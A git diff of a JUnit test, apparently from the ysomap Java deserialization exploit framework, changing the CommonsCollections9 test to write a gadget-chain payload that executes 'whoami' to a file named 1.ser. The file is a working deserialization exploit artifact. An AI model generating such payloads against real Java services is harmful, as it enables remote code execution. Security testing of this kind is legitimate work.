@@ -4,6 +4,9 @@ import org.junit.Test;
 import ysomap.core.bean.Bullet;
 import ysomap.core.bean.Payload;
 import ysomap.core.bullet.jdk.TemplatesImplBullet;
+import ysomap.core.serializer.Serializer;
+
+import java.io.FileOutputStream;
 
 /**
  * @author wh1t3P1g
@@ -18,7 +21,8 @@ public class CommonsCollections9Test {
         bullet.set("body", "whoami");
         bullet.set("exception", "true");
         payload.setBullet(bullet);
-//        Serializer serializer = payload.getSerializer();
-//        serializer.deserialize(serializer.serialize(payload.getObject()));
+        Serializer serializer = payload.getSerializer();
+        serializer.serialize(payload.getObject(), new FileOutputStream("1.ser"));
+        //serializer.deserialize(serializer.serialize(payload.getObject()));
     }
 }
